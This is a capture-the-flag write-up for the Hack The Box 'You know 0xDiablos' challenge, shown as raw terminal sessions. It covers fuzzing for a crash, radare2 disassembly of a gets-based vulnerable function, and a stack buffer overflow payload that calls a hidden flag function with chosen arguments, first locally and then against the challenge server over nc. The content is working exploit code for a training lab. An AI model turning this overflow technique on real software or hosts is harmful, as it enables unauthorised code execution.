```python
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ ./vuln       
You know who are 0xDiablos: 
asdasdasd
asdasdasd
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*125)" | ./vuln 
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*225)" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    4377 done                python -c "print('A'*225)" | 
       4378 segmentation fault  ./vuln
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*200)" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    4386 done                python -c "print('A'*200)" | 
       4387 segmentation fault  ./vuln
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*190)" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    4391 done                python -c "print('A'*190)" | 
       4392 segmentation fault  ./vuln
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*180)" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*185" | ./vuln 
You know who are 0xDiablos: 
  File "<string>", line 1
    print('A'*185
                ^
SyntaxError: unexpected EOF while parsing
 ����
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*185)" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    4406 done                python -c "print('A'*185)" | 
       4407 segmentation fault  ./vuln
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*183)" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*184)" | ./vuln
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    4414 done                python -c "print('A'*184)" | 
       4415 segmentation fault  ./vuln
```



```assembly
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ r2 vuln
[0x080490d0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
[0x080490d0]> afl
0x080490d0    1 50           entry0
0x08049103    1 4            fcn.08049103
0x08049090    1 6            sym.imp.__libc_start_main
0x08049130    4 49   -> 40   sym.deregister_tm_clones
0x08049170    4 57   -> 53   sym.register_tm_clones
0x080491b0    3 33   -> 30   sym.__do_global_dtors_aux
0x080491e0    1 2            entry.init0
0x08049390    1 1            sym.__libc_csu_fini
0x08049120    1 4            sym.__x86.get_pc_thunk.bx
0x08049391    1 4            sym.__x86.get_pc_thunk.bp
0x08049272    1 63           sym.vuln
0x08049040    1 6            sym.imp.gets
0x08049070    1 6            sym.imp.puts
0x08049398    1 20           sym._fini
0x08049330    4 93           sym.__libc_csu_init
0x08049110    1 1            sym._dl_relocate_static_pie
0x080492b1    1 118          main
0x080490a0    1 6            sym.imp.setvbuf
0x08049060    1 6            sym.imp.getegid
0x080490c0    1 6            sym.imp.setresgid
0x080491e2    8 144          sym.flag
0x080490b0    1 6            sym.imp.fopen
0x08049080    1 6            sym.imp.exit
0x08049050    1 6            sym.imp.fgets
0x08049030    1 6            sym.imp.printf
0x08049000    3 32           sym._init
[0x080490d0]> s main
```





```assembly
[0x080492b1]> pdf
            ; DATA XREFS from entry0 @ 0x80490f6, 0x80490fc
┌ 118: int main (char **argv);
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_8h @ ebp-0x8
│           ; arg char **argv @ esp+0x34
│           0x080492b1 b    8d4c2404       lea ecx, [argv]
│           0x080492b5      83e4f0         and esp, 0xfffffff0
│           0x080492b8      ff71fc         push dword [ecx - 4]
│           0x080492bb      55             push ebp
│           0x080492bc      89e5           mov ebp, esp
│           0x080492be      53             push ebx
│           0x080492bf      51             push ecx
│           0x080492c0      83ec10         sub esp, 0x10
│           0x080492c3      e858feffff     call sym.__x86.get_pc_thunk.bx
│           0x080492c8      81c3382d0000   add ebx, 0x2d38
│           0x080492ce      8b83fcffffff   mov eax, dword [ebx - 4]
│           0x080492d4      8b00           mov eax, dword [eax]
│           0x080492d6      6a00           push 0
│           0x080492d8      6a02           push 2                      ; 2
│           0x080492da      6a00           push 0                      ; char *buf
│           0x080492dc      50             push eax                    ; FILE*stream
│           0x080492dd      e8befdffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x080492e2      83c410         add esp, 0x10
│           0x080492e5      e876fdffff     call sym.imp.getegid
│           0x080492ea      8945f4         mov dword [var_ch], eax
│           0x080492ed      83ec04         sub esp, 4
│           0x080492f0      ff75f4         push dword [var_ch]
│           0x080492f3      ff75f4         push dword [var_ch]
│           0x080492f6      ff75f4         push dword [var_ch]
│           0x080492f9      e8c2fdffff     call sym.imp.setresgid
│           0x080492fe      83c410         add esp, 0x10
│           0x08049301      83ec0c         sub esp, 0xc
│           0x08049304      8d8338e0ffff   lea eax, [ebx - 0x1fc8]
│           0x0804930a      50             push eax                    ; const char *s
│           0x0804930b      e860fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08049310      83c410         add esp, 0x10
│           0x08049313      e85affffff     call sym.vuln
│           0x08049318      b800000000     mov eax, 0
│           0x0804931d      8d65f8         lea esp, [var_8h]
│           0x08049320      59             pop ecx
│           0x08049321      5b             pop ebx
│           0x08049322      5d             pop ebp
│           0x08049323      8d61fc         lea esp, [ecx - 4]
└           0x08049326      c3             ret
[0x080492b1]> 
```

```assembly
[0x080492b1]> s sym.vuln
[0x08049272]> pdf
            ; CALL XREF from main @ 0x8049313
┌ 63: sym.vuln ();
│           ; var char *s @ ebp-0xb8
│           ; var int32_t var_4h @ ebp-0x4
│           0x08049272      55             push ebp
│           0x08049273      89e5           mov ebp, esp
│           0x08049275      53             push ebx
│           0x08049276      81ecb4000000   sub esp, 0xb4
│           0x0804927c      e89ffeffff     call sym.__x86.get_pc_thunk.bx
│           0x08049281      81c37f2d0000   add ebx, 0x2d7f
│           0x08049287      83ec0c         sub esp, 0xc
│           0x0804928a      8d8548ffffff   lea eax, [s]
│           0x08049290      50             push eax                    ; char *s
│           0x08049291      e8aafdffff     call sym.imp.gets           ; char *gets(char *s)
│           0x08049296      83c410         add esp, 0x10
│           0x08049299      83ec0c         sub esp, 0xc
│           0x0804929c      8d8548ffffff   lea eax, [s]
│           0x080492a2      50             push eax                    ; const char *s
│           0x080492a3      e8c8fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x080492a8      83c410         add esp, 0x10
│           0x080492ab      90             nop
│           0x080492ac      8b5dfc         mov ebx, dword [var_4h]
│           0x080492af      c9             leave
└           0x080492b0      c3             ret
[0x08049272]> 
```
```assembly
[0x08049272]> s sym.flag
[0x080491e2]> pdf
┌ 144: sym.flag (uint32_t arg_8h, uint32_t arg_ch);
│           ; var char *format @ ebp-0x4c
│           ; var file*stream @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           ; arg uint32_t arg_8h @ ebp+0x8
│           ; arg uint32_t arg_ch @ ebp+0xc
│           0x080491e2      55             push ebp
│           0x080491e3      89e5           mov ebp, esp
│           0x080491e5      53             push ebx
│           0x080491e6      83ec54         sub esp, 0x54
│           0x080491e9      e832ffffff     call sym.__x86.get_pc_thunk.bx
│           0x080491ee      81c3122e0000   add ebx, 0x2e12
│           0x080491f4      83ec08         sub esp, 8
│           0x080491f7      8d8308e0ffff   lea eax, [ebx - 0x1ff8]
│           0x080491fd      50             push eax                    ; const char *mode
│           0x080491fe      8d830ae0ffff   lea eax, [ebx - 0x1ff6]
│           0x08049204      50             push eax                    ; const char *filename
│           0x08049205      e8a6feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│           0x0804920a      83c410         add esp, 0x10
│           0x0804920d      8945f4         mov dword [stream], eax
│           0x08049210      837df400       cmp dword [stream], 0
│       ┌─< 0x08049214      751c           jne 0x8049232
│       │   0x08049216      83ec0c         sub esp, 0xc
│       │   0x08049219      8d8314e0ffff   lea eax, [ebx - 0x1fec]
│       │   0x0804921f      50             push eax                    ; const char *s
│       │   0x08049220      e84bfeffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x08049225      83c410         add esp, 0x10
│       │   0x08049228      83ec0c         sub esp, 0xc
│       │   0x0804922b      6a00           push 0                      ; int status
│       │   0x0804922d      e84efeffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from sym.flag @ 0x8049214
│       └─> 0x08049232      83ec04         sub esp, 4
│           0x08049235      ff75f4         push dword [stream]         ; FILE *stream
│           0x08049238      6a40           push 0x40                   ; '@' ; 64 ; int size
│           0x0804923a      8d45b4         lea eax, [format]
│           0x0804923d      50             push eax                    ; char *s
│           0x0804923e      e80dfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x08049243      83c410         add esp, 0x10
│           0x08049246      817d08efbead.  cmp dword [arg_8h], 0xdeadbeef
│       ┌─< 0x0804924d      751a           jne 0x8049269
│       │   0x0804924f      817d0c0dd0de.  cmp dword [arg_ch], 0xc0ded00d
│      ┌──< 0x08049256      7514           jne 0x804926c
│      ││   0x08049258      83ec0c         sub esp, 0xc
│      ││   0x0804925b      8d45b4         lea eax, [format]
│      ││   0x0804925e      50             push eax                    ; const char *format
│      ││   0x0804925f      e8ccfdffff     call sym.imp.printf         ; int printf(const char *format)
│      ││   0x08049264      83c410         add esp, 0x10
│     ┌───< 0x08049267      eb04           jmp 0x804926d
│     │││   ; CODE XREF from sym.flag @ 0x804924d
│     ││└─> 0x08049269      90             nop
│     ││┌─< 0x0804926a      eb01           jmp 0x804926d
│     │││   ; CODE XREF from sym.flag @ 0x8049256
│     │└──> 0x0804926c      90             nop
│     │ │   ; CODE XREFS from sym.flag @ 0x8049267, 0x804926a
│     └─└─> 0x0804926d      8b5dfc         mov ebx, dword [var_4h]
│           0x08049270      c9             leave
└           0x08049271      c3             ret
[0x080491e2]> 
```


```python
~/Downloads/htb/challenges/Youknow0xDiablos/You know 0xDiablos ❯ python -c "print('A'*188 + '\xe2\x91\x04\x08')" | ./vuln     
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
Hurry up and try in on server side.
```


```python
python -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | nc 165.227.225.205 30891
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAﾭ�
HTB{0u*************healthy}
```
